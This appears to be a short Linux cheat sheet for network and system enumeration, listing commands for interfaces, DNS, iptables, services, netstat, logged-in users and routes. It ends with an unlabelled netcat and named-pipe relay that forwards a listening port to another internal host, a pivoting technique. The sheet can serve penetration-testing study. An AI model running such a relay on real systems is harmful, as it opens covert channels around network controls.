IP Address
```
ifconfig 
ifconfig -a # show more info
```

Show networking interface configs:
```
cat /etc/network/interfaces.d/*
cat /etc/sysconfig/network # depending O/S
cat /etc/networks
```

More networking info
```
cat /etc/resolv.conf #DNS
```

This config Linux networking
```
cat /etc/sysctl.conf
```

ipTables
```
iptables -L #show all iptables rules
```

Hostname details:
```
hostname
```

What other services communicate with the system
```
grep 80 /etc/services
cat /etc/services |grep 80
```

Netstat (Check man pages for flag meanings):
```
netstat -antup
netstat -tulpn
```

Display last login users
```
last
```

Show who is logged on and what they are doing
```
w
```

What is cached:
```
route
route -n #default gateway
```

 
```
mknod backpipe p ; nc -l -p 4444 < backpipe | nc 10.211.55.8 80 > backpipe
```

